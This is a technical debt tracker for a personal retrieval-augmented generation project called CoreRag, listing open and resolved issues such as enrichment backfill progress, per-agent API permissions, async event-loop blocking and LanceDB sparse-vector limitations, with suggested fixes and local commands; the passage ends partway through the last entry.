# Tech Debt Tracker — CoreRag

> Standard: `~/Tech_Projects/_HQ/standards/TECH_DEBT.md`

## Summary

| Severity | Open | Resolved | Blocked | Deferred |
|----------|------|----------|---------|----------|
| Critical | 0 | 4 | 0 | 0 |
| High | 2 | 12 | 0 | 0 |
| Medium | 3 | 19 | 1 | 0 |
| Low | 6 | 4 | 0 | 2 |

## Quick Reference

| ID | Title | Severity | Status |
|----|-------|----------|--------|
| TD-001 | Enrichment backfill Phase 1 at 85.5% (1,060 chunks remaining) | High | Open |
| TD-002 | RBAC → per-agent permissions (SettingsManager) | Medium | **Resolved (Session 32, SP5)** |
| TD-003 | Code chunker missing (Python/JS/TS/Go/Rust) | Medium | Resolved (Session 31) |
| TD-004 | Hero image missing for GitHub social preview | Medium | Resolved (Session 31) |
| TD-005 | StartHere.md references outdated path | Low | Resolved |
| TD-006 | rag_evaluator.py uses wrong generate() call signature | Low | Resolved |
| TD-007 | REST API search bypasses HybridSearcher | High | Resolved (Session 31) |
| TD-008 | Three divergent ingest paths | High | Resolved (Session 31) |
| TD-009 | EmbeddingService re-initialized per API request | Medium | Resolved (Session 31) |
| TD-010 | Chat endpoint bypasses LLMProvider abstraction | Medium | Resolved (Session 31) |
| TD-011 | Module-level singletons in processor.py | Medium | Resolved (Session 31) |
| TD-012 | pyproject.toml dependency versions outdated | Medium | Resolved (Session 31) |
| TD-013 | Staging manifest grows unbounded | Medium | Resolved (Session 31) |
| TD-014 | BGE-M3 sparse vectors blocked on LanceDB | Medium | Blocked (external dep) |
| TD-015 | CoreRagTools god object | Medium | Resolved (Session 31) |
| TD-016 | dashboard_routes.py large file | Low | Open |
| TD-017 | SQLite connection leak in catalog + KG read methods | Low | **Resolved (Session 33, P9 W2)** |
| TD-018 | 3 docs failed LLM re-classification | Low | Open |
| TD-019 | Native folder picker for cold storage (SP6) | Low | Deferred to SP6 |
| TD-020 | Auto-detect reconnected cold storage drives (SP6) | Low | Deferred to SP6 |
| TD-021 | Verify SP3 dual RAG end-to-end | Medium | Open |
| TD-022 | 72 legacy vault files missing catalog entries + metadata | Medium | Open |
| TD-023 | 111 inbox files awaiting processing | Low | Open |
| TD-024 | Event loop blocking in async code paths | Critical | **Resolved (Session 33, P9 W2)** |
| TD-025 | PII redaction silent fallback to unredacted text | Critical | **Resolved (Session 33, P9 W1)** |
| TD-026 | Gemini CLI prompt injection via -p argument | Critical | **Resolved (Session 33, P9 W1)** |
| TD-027 | Cold storage path traversal (unvalidated destination) | Critical | **Resolved (Session 33)** |
| TD-028 | Dashboard XSS (innerHTML without escaping) | High | **Resolved (Session 33, P9 W1)** |
| TD-029 | /api/v1/vaults unauthenticated path exposure | High | **Resolved (Session 33)** |
| TD-030 | SQL injection-prone f-string in KG schema migration | High | **Resolved (Session 33, P9 W1)** |
| TD-031 | LanceDB connection/table opened per request | High | **Resolved (Session 33, P9 W2)** |
| TD-032 | Tag update rewrites all vectors (read-delete-reinsert) | High | **Resolved (Session 33, P9 W2)** |
| TD-033 | Embedding model loaded per document commit | High | **Resolved (Session 33, P9 W2)** |
| TD-034 | Full table scans for document counts | High | **Resolved (Session 33, P9 W2)** |
| TD-035 | N SQLite open/close per entity in knowledge graph | High | **Resolved (Session 33, P9 W2)** |
| TD-036 | Security-critical modules have zero test coverage | High | **Resolved (Session 33, P9 W3)** |
| TD-037 | settings_routes.py + ingest_service.py untested | High | **Partial (Session 33, P9 W3 — 3 mock fixes remain)** |
| TD-038 | file_size always 0 in catalog (stat after archive) | High | **Resolved (Session 33, P9 W2)** |
| TD-039 | ResultCache not thread-safe | Medium | **Resolved (Session 33, P9 W2)** |
| TD-040 | catalog_search ignores tags when query provided | Medium | **Resolved (Session 33, P9 W2)** |
| TD-041 | No CSRF protection on dashboard endpoints | Medium | **Resolved (Session 33)** |
| TD-042 | Legacy key + open mode grant search_restricted | Medium | **Resolved (Session 33)** |
| TD-043 | API error messages leak internal exception details | Medium | **Resolved (Session 33)** |
| TD-044 | LRU cache O(n) list operations | Medium | **Resolved (Session 33, P9 W2)** |
| TD-045 | Commit pause/stop race condition | Medium | **Resolved (Session 33, P9 W2)** |
| TD-046 | Silent exception swallowing in executor | Medium | **Resolved (Session 33, P9 W2)** |
| TD-047 | pyproject.toml missing ~20 runtime packages | Medium | **Resolved (Session 33, P9 W4)** |
| TD-048 | .env.example + config variable drift | Medium | Open |
| TD-049 | SettingsManager file stat on every request | Medium | **Resolved (Session 33, P9 W2)** |
| TD-050 | Documentation staleness (StartHere, Architecture, Settings API) | Low | **Partial (Session 33 — Architecture done, StartHere/CLAUDE.md/DevPlan remain)** |
| TD-051 | Stale GOOGLE_API_KEY warning + misc cleanup | Low | **Resolved (Session 33, P9 W4)** |
| TD-052 | Pre-existing test failure: test_approve_archives_and_exports | Low | Open |
| TD-053 | Intermittent test failure: test_concurrent_adds_no_corruption | Low | Open |

---

## Open Items

### TD-001: Enrichment Backfill Phase 1 In Progress (~85.5%)

- **Severity:** High
- **Category:** Data Quality
- **Found:** 2026-02-28 (Session 27)
- **Updated:** 2026-03-14 (Session 31)
- **Files:** `scripts/backfill_enrichment.py`, `src/chunking/context_generator.py`, `~/.corerag/backfill_checkpoint.json`
- **Description:** P6 enrichment backfill Phase 1 (context prefixes) at 6,269/7,329 (85.5%). Session 31 fixed model resolution bug (`CORERAG_LLM_MODEL=opus` was overriding Ollama's model) and added backfill-specific `_BACKFILL_MODEL_DEFAULTS`. Ollama qwen3:32b processed 207 additional prefixes before hitting memory safety threshold (78.6% RAM). 1,060 chunks remaining.
- **Impact:** ~14.5% of chunks still lack contextual retrieval prefixes. All chunks need re-embedding after Phase 1 completes. Parent summaries and KG re-extraction pending.
- **Suggested Fix:** Resume Phase 1: `python scripts/backfill_enrichment.py --resume --provider ollama --phases 1`. After completion, run Phases 2-4. Memory limit may require multiple runs or closing other applications.
- **Trigger:** Next session with available memory. Close qwen3:32b-consuming processes first.

### TD-002: RBAC → Per-Agent Permissions (SettingsManager)

- **Severity:** Medium
- **Category:** Architecture / Security
- **Found:** 2026-01-15 (Phase 11 audit)
- **Resolved:** 2026-03-16 (Session 32, P8 SP5)
- **Resolution:** Replaced single-API-key auth with per-agent permissions via `SettingsManager`. Each agent gets unique API key + per-action permission toggles (search_main, search_restricted, ingest, delete, server_admin, catalog_read, catalog_write). Dashboard Settings tab for agent CRUD. `verify_api_key()` replaced with `check_permissions()`. `access_control.py` deprecated.
- **Original Planned Resolution:** P8 SP5 (Search Fan-out + Privacy Controls)
- **Files:** `src/auth/access_control.py`, `src/server.py`, `src/api/v1_routes.py`, `src/search/hybrid_search.py`
- **Description:** AccessControl module implements RBAC with ADMIN/EDITOR/VIEWER roles and PII-based result filtering. The scaffold is complete but not wired into any server routes or API endpoints. Currently a dead module. **SP3 adds a `search_scope` parameter** ("main", "restricted", "all") to all search paths, defaulting to "main" for safety. RBAC enforcement (this TD) must control which roles can request which scopes.
- **Impact:** All API consumers share a single `CORERAG_API_KEY` with identical permissions. With the dual RAG database (SP3), the restricted DB contains unredacted PII (SSNs, bank accounts, medical records). Without RBAC, the only protection is the `search_scope` defaulting to "main".
- **Current consumers using the API:**
  - **Kendra** — trusted AI assistant, MCP (stdio) + REST API. Should have ADMIN access — but ONLY when using local LLM (Ollama). When Kendra routes through cloud LLMs (Gemini/Claude API), restricted access must be blocked.
  - **Centaur** — content engine for LinkedIn/YouTube. VIEWER access ONLY — must never see restricted/PII content (content goes to public social media).
  - **Claude Desktop** — MCP (stdio). ADMIN access — same cloud LLM caveat as Kendra.
  - **Future agents** — default VIEWER.
- **Suggested Implementation (updated for SP3):**
  1. **role_mappings.yaml** (unchanged from original plan):
     ```yaml
     keys:
       kendra-api-key-here: ADMIN
       centaur-api-key-here: VIEWER
     default_role: VIEWER
     ```
  2. **`verify_api_key()` resolves role** → stores on `request.state.user_role`
  3. **Search scope enforcement per role:**
     - VIEWER → forced to `search_scope="main"`, cannot override
     - EDITOR → `"main"` default, can request `"all"` only if provider is local
     - ADMIN → `"main"` default, can request any scope only if provider is local
  4. **Provider check (CRITICAL):** Before allowing `search_scope="restricted"` or `"all"`, verify `CORERAG_LLM_PROVIDER` is local-only (Ollama). Cloud providers (claude-cli, gemini-cli, gemini, anthropic, codex-cli) → block restricted scope even for ADMIN. Reason: restricted text flows to LLM context window, which goes through cloud servers.
  5. **MCP access** (stdio) defaults to ADMIN role
  6. **Settings UI in dashboard** (new "Settings" tab):
     - List agents/API keys with assigned roles
     - Per-agent role selector (ADMIN/EDITOR/VIEWER)
     - Per-agent default search scope override
     - LLM provider awareness — flag if restricted-access agent uses cloud LLM
     - API key generation from UI
     - Backend endpoints: `GET/POST /api/settings/agents`, `POST /api/settings/agents/new`
  7. **Local model toggle:** When Ollama is configured, allow dashboard chat and CLI to access restricted content via explicit opt-in. Settings UI: "Use local model for restricted search" toggle.
- **Effort:** ~8 files, ~300 lines (expanded from original estimate due to Settings UI + provider check)
- **Full design notes:** `docs/superpowers/specs/2026-03-15-p8-sp3-dual-rag-export-routing-spec.md` Section 7 (Forward Design Notes for SP5)
- **Trigger:** P8 SP5 (Search Fan-out + Privacy Controls) — after SP3 (dual DB) and SP4 (redaction editor) are complete
  5. No role mapping configured → single key behaves as today (ADMIN for all)
- **Effort:** ~5 files, ~100 lines. P7 spec Wave 4, item 4.8 has the full plan.
- **Trigger:** When Centaur starts actively consuming CoreRag search results for content generation. At that point, PII filtering becomes important to prevent sensitive data leaking into LinkedIn posts.

### TD-003: Code File Chunker Missing

- **Severity:** Medium
- **Category:** Feature Gap
- **Found:** 2026-01-20 (Phase 11 audit)
- **Files:** `src/extractor.py` (missing handler), `src/chunking/parent_child.py`
- **Description:** The original code chunker was deleted as orphaned scaffold. No replacement exists. Python, JavaScript, TypeScript, Go, and Rust files cannot be ingested. `extractor.py` has no handler for these file types.
- **Impact:** Code files in the inbox are skipped. Users who want to index code repositories cannot do so.
- **Suggested Fix:** Implement AST-aware chunking for Python (tree-sitter or ast module), with fallback to line-based chunking for other languages. Wire into `extractor.py` file type routing. ~3 new files, ~300 lines.
- **Trigger:** When code indexing is requested or prioritized in roadmap.

### TD-007: REST API Search Bypasses HybridSearcher

- **Severity:** High
- **Category:** Architecture / Search Quality
- **Found:** 2026-03-14 (P7 codebase audit, Session 31)
- **Files:** `src/api/v1_routes.py:310-345`, `src/server.py` (lifespan)
- **Description:** `/api/v1/search` does plain vector search via `child_table.search(query_vector).limit(k)`. It skips BM25 hybrid fusion, cross-encoder reranking, time-decay scoring, and Corrective RAG filtering that the MCP `search_knowledge` tool applies. External consumers (Kendra, Centaur) get worse results than Claude Desktop for identical queries.
- **Impact:** Split-quality search results. API consumers receive lower quality than MCP consumers.
- **Suggested Fix:** Route `/api/v1/search` through `HybridSearcher` initialized in FastAPI lifespan. See P7 spec Wave 2, item 2.2.
- **Trigger:** P7 Wave 2 execution (next CoreRag session).

### TD-008: Three Divergent Ingest Paths

- **Severity:** High
- **Category:** Architecture
- **Found:** 2026-03-14 (P7 codebase audit, Session 31)
- **Files:** `src/executor.py`, `src/api/v1_routes.py:500-570,850-900`
- **Description:** CoreRag has three distinct ingest paths: (1) full pipeline via executor (dedup, context gen, quality scoring, PII, graph, versioning), (2) API v1 ingest (basic chunking + embedding only), (3) quick-capture (children only, no parents). Documents ingested via API are second-class — no context prefixes, quality scores, or graph entries.
- **Impact:** API-ingested documents have lower retrieval quality and are invisible to entity search.
- **Suggested Fix:** Extract shared `IngestService` from `executor.py:_index_in_rag()`. Route all paths through it with feature flags. See P7 spec Wave 3, item 3.1.
- **Trigger:** P7 Wave 3 execution.

### TD-009: EmbeddingService Re-initialized Per API Request

- **Severity:** Medium
- **Category:** Performance
- **Found:** 2026-03-14 (P7 codebase audit, Session 31)
- **Files:** `src/api/v1_routes.py:297,404,512,877`
- **Description:** `create_embedding_service()` is called per API request. Each call potentially loads the BGE-M3 model (~2GB). The MCP server initializes once at startup.
- **Impact:** Unnecessary memory allocation and latency per request.
- **Suggested Fix:** Initialize once in FastAPI lifespan, store on `app.state`. See P7 spec Wave 2, item 2.1.
- **Trigger:** P7 Wave 2 execution.

### TD-010: Chat Endpoint Bypasses LLMProvider Abstraction

- **Severity:** Medium
- **Category:** Architecture / Consistency
- **Found:** 2026-03-14 (P7 codebase audit, Session 31)
- **Files:** `src/api/dashboard_routes.py:764-839`
- **Description:** Dashboard chat endpoint makes a direct `httpx` POST to Ollama's `/api/chat`. It bypasses the `LLMProvider` abstraction — `CORERAG_LLM_PROVIDER` setting has no effect on chat. Also uses weaker search (plain vector, no hybrid).
- **Impact:** Chat endpoint cannot use non-Ollama providers. Search quality in chat is lower than MCP/API.
- **Suggested Fix:** Replace raw httpx call with `get_default_provider()`. See P7 spec Wave 2, item 2.3.
- **Trigger:** P7 Wave 2 execution.

### TD-011: Module-Level Singletons in processor.py

- **Severity:** Medium
- **Category:** Architecture / Test Performance
- **Found:** 2026-03-14 (P7 codebase audit, Session 31)
- **Files:** `src/processor.py:14-20`
- **Description:** `_dedup`, `_pii_scanner`, `_custom_pii_terms` are initialized at import time. `PrivacyScanner()` loads the spaCy `en_core_web_lg` model (hundreds of MB). Any test importing `processor` triggers full model loading.
- **Impact:** Slower test suite, requires careful mocking in conftest.py.
- **Suggested Fix:** Convert to lazy-init pattern (matching `_get_auto_tagger()` already in file). See P7 spec Wave 3, item 3.2.
- **Trigger:** P7 Wave 3 execution.

### TD-012: pyproject.toml Dependency Versions Far Below Installed

- **Severity:** Medium
- **Category:** Dependency Health
- **Found:** 2026-03-14 (P7 codebase audit, Session 31)
- **Files:** `pyproject.toml`
- **Description:** Minimum versions (`lancedb>=0.4.0`, `sentence-transformers>=2.2.0`, `fastmcp>=0.1.0`) are far below actually-installed versions. Anyone installing via `pip install .` gets incompatible APIs.
- **Impact:** Broken installation for new users installing from pyproject.toml.
- **Suggested Fix:** Sync minimum versions with `requirements.txt` lower bounds. See P7 spec Wave 3, item 3.8.
- **Trigger:** P7 Wave 3 execution.

### TD-013: Staging Manifest Grows Unbounded

- **Severity:** Medium
- **Category:** Performance / Operations
- **Found:** 2026-03-14 (P7 codebase audit, Session 31)
- **Files:** `src/staging.py`
- **Description:** No mechanism to prune completed or error items from `staging_manifest.json`. The manifest is rewritten in its entirety on every `update_item()` call. Over time, it accumulates indefinitely.
- **Impact:** Increasing cost of every manifest operation as the file grows.
- **Suggested Fix:** Add `cleanup_manifest()` called on server startup. Archive old items. See P7 spec Wave 4, item 4.6.
- **Trigger:** P7 Wave 4 execution or when manifest exceeds ~100 items.

### TD-014: BGE-M3 Sparse Vectors — Blocked on LanceDB SparseVector Support

- **Severity:** Medium
- **Category:** Search Quality / External Dependency
- **Found:** 2026-03-14 (P7 codebase audit, Session 31)
- **Updated:** 2026-03-15 (Session 31 — migration attempt failed)
- **Status:** BLOCKED (waiting on external dependency)
- **Files:** `src/embeddings/embedding_service.py` (embed_with_sparse), `src/search/hybrid_search.py` (_sparse_search, _reciprocal_rank_fusion_3way), `src/ingest_service.py` (dual encoding), `scripts/migrate_embeddings.py` (--include-sparse)
- **Description:** CoreRag's 3-way hybrid search infrastructure is fully built: FlagEmbedding encoding (BGEM3FlagModel on MPS), 3-way RRF fusion in HybridSearcher, sparse query generation in MCP + REST pipelines, dual encoding in IngestService. However, LanceDB (tested v0.27.1 and v0.29.2) does NOT have a native `SparseVector` type. Gem's research incorrectly reported this capability. Sparse dicts stored as raw Python dicts are serialized as PyArrow structs (one column per key), which doesn't scale for BGE-M3's 250k vocabulary.
- **Impact:** 3-way hybrid search defaults to 2-way (dense + BM25) until LanceDB adds sparse support. The existing 2-way hybrid provides good quality — sparse would be incremental improvement for keyword-heavy queries.
- **What's Built (DO NOT DELETE):**
  - `embed_with_sparse()` + `embed_query_with_sparse()` on EmbeddingService (FlagEmbedding, MPS)
  - `_sparse_search()` + `_reciprocal_rank_fusion_3way()` on HybridSearcher
  - `query_sparse` parameter wired through MCP `search_knowledge` and REST `/api/v1/search`
  - IngestService generates `sparse_vector` field (empty dict when sparse unavailable)
  - `--include-sparse` flag on `migrate_embeddings.py`
  - FlagEmbedding compatibility patch for transformers 5.0 (`is_torch_fx_available`)
- **Trigger:** Check LanceDB releases for `SparseVector` type or `SPARSE_INVERTED` index support. Specifically look for:
  - `lancedb.pydantic.SparseVector` in the Python SDK
  - `create_index(column=..., index_type="SPARSE_INVERTED")` in the API
  - Any changelog entry mentioning "sparse" or "learned sparse"
- **When Triggered:**
  1. Upgrade LanceDB to the version with SparseVector support
  2. Update `migrate_embeddings.py` to use `SparseVector` schema for table creation
  3. Run migration: `python scripts/migrate_embeddings.py --include-sparse`
  4. Create sparse index: `table.create_index(column="sparse_vector", index_type="SPARSE_INVERTED")`
  5. Verify 3-way search activates (query_sparse is already wired end-to-end)
  6. Update TD-014 status to Resolved
- **How to Check:** `pip install lancedb --upgrade && python -c "from lancedb.pydantic import SparseVector; print('Available')"`
- **Research:** `_RESEARCH/sparse_vector_feasibility.md` (note: Gem findings on SparseVector availability were incorrect)
- **LanceDB Issue Tracker:** Check https://github.com/lancedb/lancedb/issues for "sparse vector" issues

### TD-015: CoreRagTools God Object (1,173 lines, 22 methods)

- **Severity:** Medium
- **Category:** Code Quality / Maintainability
- **Found:** 2026-03-14 (P7 codebase audit, Session 31)
- **Files:** `src/mcp_server/tools.py`
- **Description:** CoreRagTools has 22 public methods and 6 private helpers across search, memory, quality, maintenance, and integration domains. Session 31 created 3 tool group classes (MemoryTools, QualityTools, MaintenanceTools) and stores them on CoreRagTools.__init__, but the original methods have not been replaced with delegations yet. CoreRagTools still works as a monolith — the groups are created alongside, not instead of.
- **Impact:** Navigating and testing a 1,173-line class is harder than 5 focused files.
- **Suggested Fix:** Replace each method body in CoreRagTools with a delegation to the corresponding tool group (e.g., `return await self._memory.get_user_context()`). This preserves the facade API while making each group independently testable.
- **Trigger:** Next session focused on code quality / maintainability.

### TD-016: dashboard_routes.py (934 lines, 38 routes)

- **Severity:** Low
- **Category:** Code Quality / Maintainability
- **Found:** 2026-03-14 (P7 codebase audit, Session 31)
- **Files:** `src/api/dashboard_routes.py`
- **Description:** Session 31 extracted the chat route to `dashboard_chat.py` (mounted as sub-router). The remaining 37 routes (memory, analytics, batch, tags, folders, RAG browser) are still in one file.
- **Impact:** Navigation difficulty. Lower priority than TD-015.
- **Suggested Fix:** Extract memory routes (~148 lines) and analytics routes (~104 lines) into `dashboard_memory.py` and `dashboard_analytics.py`. Mount as sub-routers.
- **Trigger:** Next session focused on code quality / maintainability.

### TD-018: 3 Documents Failed LLM Re-classification (JSON Parse Errors)

- **Severity:** Low
- **Category:** Data Quality
- **Found:** 2026-03-15 (P8 SP1 Task 8, Session 32)
- **Files:** `scripts/rebuild_catalog.py`, `~/Documents/PKM/_catalog.db`
- **Description:** During the retroactive LLM re-classification of 99 existing documents (Task 8), 3 files failed because Ollama qwen3:32b produced malformed JSON that couldn't be repaired. 96/99 succeeded (97% rate).
- **Affected Documents:**
  1. `Engagement_Trends.pdf` — Already has decent metadata from manifest (category=Education, tags=human-resources). Low impact.
  2. `Security_and_Data_Integrity.pdf` — Already has decent metadata from manifest (category=Education, tags=human-resources,compliance). Low impact.
  3. `single_tasking_productivity_guide.pdf` — **Only remaining "Unsorted" document** in catalog. Has old keyword-tagger tags (fitness,workout,plan,training,mind-pump,gym,lifting) which are wrong — it's a productivity guide, not fitness. No summary.
- **Impact:** 1 of 102 catalog entries has wrong category/tags/summary. The other 2 failures had acceptable fallback metadata.
- **Suggested Fix:** Re-run for just these 3 docs. Either:
  - `python scripts/rebuild_catalog.py` (will skip 96 already-updated, retry the 3)
  - Or manually: query the catalog for "Unsorted", re-classify with `analyze_document()`, update via `catalog.update()`
  - If qwen3 keeps failing on JSON, try with `CORERAG_LLM_PROVIDER=claude-cli` for higher JSON reliability
- **Trigger:** Next CoreRag session, or when cleaning up catalog data quality.

### TD-021: Verify SP3 Dual RAG End-to-End

- **Severity:** Medium
- **Category:** Verification / Integration Testing
- **Found:** 2026-03-15 (P8 SP3 completion, Session 32)
- **Status:** Open
- **Files involved:** `src/executor.py` (dual-track commit), `src/search/hybrid_search.py` (fan-out search), `src/ui/templates/dashboard.html` (Main/Restricted RAG checkboxes)
- **Description:** SP3 implemented the dual RAG database infrastructure (restricted LanceDB + search fan-out + dashboard checkboxes) but has NOT been tested end-to-end with a real sensitive document. The implementation was verified via unit tests (678 passing) but the full pipeline — inbox → analysis → PII detection → dashboard review → dual commit → catalog tracking → search across both DBs — needs manual verification.
- **Verification steps:**
  1. **Start the server:** `python -m src.server`
  2. **Drop a sensitive document** into `~/Desktop/Inbox/` — use a file that contains PII the custom dictionary will catch (e.g., a document with your name, SSN pattern, or other terms from `~/.corerag/pii_terms.yaml`)
  3. **Open dashboard** at `localhost:8000`, click "Start Analysis"
  4. **Verify dashboard checkboxes:** The file card should show:
     - "Mark as Sensitive" checkbox: checked (auto-detected)
     - "Main RAG (redacted if sensitive)": checked
     - "Restricted RAG (unredacted)": checked (auto-checked because sensitive)
     - "Send to Obsidian": checked
  5. **Commit the file** via "Commit All"
  6. **Verify main RAG:** `python -m src.cli.main search "relevant query"` — results should come from main DB with redacted text (PII replaced with [REDACTED-TYPE] placeholders)
  7. **Verify restricted RAG exists:** Check `ls ~/.corerag/lancedb-restricted/` — should have `child_chunks.lance/` and `parent_chunks.lance/` directories
  8. **Verify restricted RAG content:** Use Python directly:
     ```python
     import lancedb
     db = lancedb.connect(str(Path.home() / ".corerag/lancedb-restricted"))
     t = db.open_table("child_chunks")
     print(t.count_rows())  # Should have chunks
     # Check that text is NOT redacted (original PII present)
     ```
  9. **Verify catalog:** `python -m src.cli.main catalog list --sensitive` — should show the document with `restricted_rag_doc_id` populated
  10. **Verify search_scope:** Test fan-out search via REST API:
      ```bash
      curl -X POST http://localhost:8000/api/v1/search \
        -H "Content-Type: application/json" \
        -H "X-API-Key: your_key" \
        -d '{"query": "relevant query", "search_scope": "all"}'
      ```
      Results should include `source_db: "restricted"` for the sensitive doc
  11. **Test checkbox override:** Process another sensitive doc, uncheck "Restricted RAG" before commit — verify it only goes to main RAG
- **What to do if something fails:** Use `superpowers:systematic-debugging` skill. The most likely failure points are: (a) `config.RESTRICTED_DB_PATH` not resolving correctly, (b) `IngestService` failing to create tables in the new DB, (c) `search_scope` not being passed through the full MCP/REST chain.
- **Trigger:** Next CoreRag session — should be the first thing verified before starting SP4.

### TD-020: Auto-Detect Reconnected Cold Storage Drives (SP6 Enhancement)

- **Severity:** Low
- **Category:** UX Enhancement
- **Found:** 2026-03-15 (P8 SP2 brainstorm, Session 32)
- **Status:** Deferred to SP6
- **Files:** `src/catalog/catalog_manager.py`, `src/menubar/app.py` (or new background service), `src/server.py` (lifespan)
- **Description:** When files are migrated to cold storage (e.g., external hard drive "WD_Passport_2TB"), the catalog marks them `storage_accessible=0`. Currently there is no mechanism to detect when that drive is reconnected and update the accessibility flag back to 1. The user sees "offline" indefinitely until someone manually updates the catalog.
- **Implementation approach:**
  1. **Drive detection:** On macOS, use `diskutil list` or monitor `/Volumes/` for mount events. When a new volume appears, check if its name matches any `storage_device` value in the catalog.
  2. **Path validation:** For each matching device, check if the recorded `archive_path` exists on the newly-mounted volume. If yes → set `storage_accessible=1`.
  3. **Integration point — Menubar app:** The `src/menubar/app.py` already has a polling loop for server status. Add a periodic check (every 60s) that scans `/Volumes/` for known device names. When a match is found, call `CatalogManager.update_device_accessibility(device_name, accessible=True)`.
  4. **Integration point — Server lifespan:** Alternatively, add a background task in `src/server.py` lifespan that does the same polling. This works even without the menubar app.
  5. **Disconnect detection:** When a volume disappears from `/Volumes/`, set `storage_accessible=0` for all documents on that device.
  6. **New CatalogManager method:** `update_device_accessibility(device_name: str, accessible: bool)` — bulk updates all documents with matching `storage_device`.
- **macOS-specific:** `FSEvents` or `PyObjC NSWorkspace.didMountNotification` could replace polling for event-driven detection. This is more efficient but adds PyObjC dependency (already present for menubar app).
- **Why SP6:** Requires the standalone app context (menubar or native app) to have a persistent background process. The current browser-served dashboard has no background monitoring capability.
- **Trigger:** SP6 (Standalone macOS App) development begins.

### TD-019: Native Folder Picker for Cold Storage (SP6 Enhancement)

- **Severity:** Low
- **Category:** UX Enhancement
- **Found:** 2026-03-15 (P8 SP2 brainstorm, Session 32)
- **Status:** Deferred to SP6
- **Files:** `src/ui/templates/dashboard.html` (archive manager cold storage UI), `src/menubar/app.py` (or new native bridge)
- **Description:** The P8 SP2 archive manager uses a dropdown + text input for cold storage device/path selection. When CoreRag becomes a standalone macOS app (SP6), a native `NSOpenPanel` folder picker should be added as a "Browse..." button. The current UI design is additive-compatible — the native picker supplements the dropdown, doesn't replace it.
- **Implementation:** Use PyObjC `NSOpenPanel` to open macOS native folder picker. Expose via a local API endpoint (e.g., `POST /api/native/folder-picker`) that the dashboard JS calls. Returns the selected path. Falls back to text input if the native bridge isn't available (browser-only mode).
- **Trigger:** SP6 (Standalone macOS App) development begins.

### TD-017: SQLite Connection Leak in Read Methods

- **Severity:** Low
- **Category:** Code Quality / Resource Management
- **Found:** 2026-03-15 (P8 SP1 code quality review, Session 32)
- **Files:** `src/catalog/catalog_manager.py` (get, search, get_exports, get_stats), `src/graph/knowledge_graph.py` (similar pattern)
- **Description:** Read methods (`get()`, `search()`, `get_exports()`, `get_stats()`) open a SQLite connection and call `.close()` at the end, but if an exception occurs mid-method (e.g., in `_row_to_record()`), the connection is never closed. Write methods have try/except but also don't guarantee close on exception. This matches the existing pattern in `knowledge_graph.py`.
- **Impact:** Minor — SQLite connections are lightweight and Python's GC closes them. But it's not best practice. No observed issues.
- **Suggested Fix:** Use context managers (`with sqlite3.connect(...) as conn:`) or `try/finally` blocks. Apply to both `catalog_manager.py` and `knowledge_graph.py`. ~20 methods across both files.
- **Trigger:** Next code quality / maintenance session.

### TD-022: 72 Legacy Vault Files Missing Catalog Entries + Metadata

- **Severity:** Medium
- **Category:** Data Quality
- **Found:** 2026-03-16 (Session 32 — vault audit)
- **Files:** `~/Documents/ObsidianVault/Ingested/` (72 files), `scripts/rebuild_catalog.py`, `scripts/rebuild_vault_exports.py`
- **Description:** 72 Obsidian vault markdown files were exported before the document catalog existed (SP1). They have "No summary provided", only category/type/year as tags (no LLM collection tags), and no catalog entries. These are legitimate documents in the RAG database but invisible to the catalog and archive manager.
- **Impact:** The archive manager shows 102 documents but the vault has 171 files. 72 files have poor metadata in Obsidian (no summaries, generic tags). These files ARE in the main RAG LanceDB but not tracked in the SQLite catalog.
- **Suggested Fix:**
  1. Run `python scripts/rebuild_catalog.py` to check if these 72 docs have LanceDB entries (they should — they were ingested before the catalog)
  2. If found, they'll be added to the catalog with metadata from LanceDB + manifest
  3. Then run `python scripts/rebuild_vault_exports.py` to re-export with improved metadata
  4. If some are NOT in LanceDB, they may need re-ingestion from the vault text (reverse path)
- **Trigger:** Next data quality session. Non-blocking — the vault files are readable, just poorly tagged.

### TD-023: 111 Inbox Files Awaiting Processing

- **Severity:** Low
- **Category:** Operations
- **Found:** 2026-03-16 (Session 32)
- **Files:** `~/Desktop/Inbox/` (111 files)
- **Description:** 111 files are sitting in the inbox folder waiting to be processed through the ingestion pipeline. These were identified during Session 31 when the batch analysis was run but the files were not committed due to PII detection issues being addressed in P8.
- **Impact:** Documents not yet in the RAG database or catalog. No search access to this content.
- **Suggested Fix:**
  1. Start the server: `python -m src.server`
  2. Open dashboard at `localhost:8000`
  3. Click "Start Analysis" to process the batch
  4. Review files in dashboard — use the new skip button, quality banner, and redaction editor (all built in P8 SP2/SP4)
  5. Commit approved files — they'll now go through the dual-track pipeline (SP3) with catalog registration (SP1)
- **Trigger:** Next operational session. These files have been waiting since Session 31.

### TD-024: Event Loop Blocking in Async Code Paths

- **Severity:** Critical
- **Category:** Async Correctness
- **Found:** 2026-03-17 (P9 5-agent audit, Session 33)
- **Files:** `src/mcp_server/server.py:136-137`, `src/search/hybrid_search.py:358-395`, `src/api/dashboard_routes.py:458,477`
- **Description:** Three critical async code paths are declared `async` but contain no actual `await` suspension points, causing them to block the asyncio event loop for the entire duration of their execution:
  1. **`_embed_query()` in MCP server** (line 136): Wraps `_embedding_service.embed_query()` — a pure-Python CPU-bound synchronous function — in an `async def` without `asyncio.to_thread()`. Every MCP search call blocks the event loop during BGE-M3 inference (can be seconds for large queries).
  2. **`_vector_search_on()`, `_fts_search_on()`, `_sparse_search_on()` in HybridSearcher** (lines 358-395): All three helper methods are `async def` but call synchronous LanceDB operations (`table.search(...).to_list()`). LanceDB I/O holds the GIL for non-trivial data sizes. The callers correctly `await` these methods, but since the callees have no internal `await`, they complete synchronously with no suspension point.
  3. **`execute_approved_item` via BackgroundTasks** (lines 458, 477): This is a long-running synchronous function (archives files, runs LLM-powered RAG indexing). When called via `background_tasks.add_task(execute_approved_item, item_id)`, FastAPI/Starlette runs synchronous functions directly on the event loop thread (it does NOT auto-offload to `asyncio.to_thread`). This blocks the entire ASGI event loop for the full commit duration. **Note:** The bulk-commit path (`/api/commit-all`, line 573) correctly uses `threading.Thread` — only the single-item and bulk-approve paths have this issue.
- **Impact:** The server is effectively single-threaded during search and commit operations. Under MCP stdio transport, no other coroutines can run while embedding or LanceDB I/O runs. Under REST API, concurrent HTTP requests queue behind any active search or commit.
- **Suggested Fix:**
  1. MCP embed: `return await asyncio.to_thread(_embedding_service.embed_query, text)`
  2. HybridSearcher: Wrap each `.to_list()` call in `asyncio.to_thread()`:
     ```python
     async def _vector_search_on(self, table, query_vector, k, filters):
         def _run():
             search = table.search(query_vector).limit(k)
             if filters:
                 search = search.where(self._build_filter_clause(filters))
             return search.to_list()
         return await asyncio.to_thread(_run)
     ```
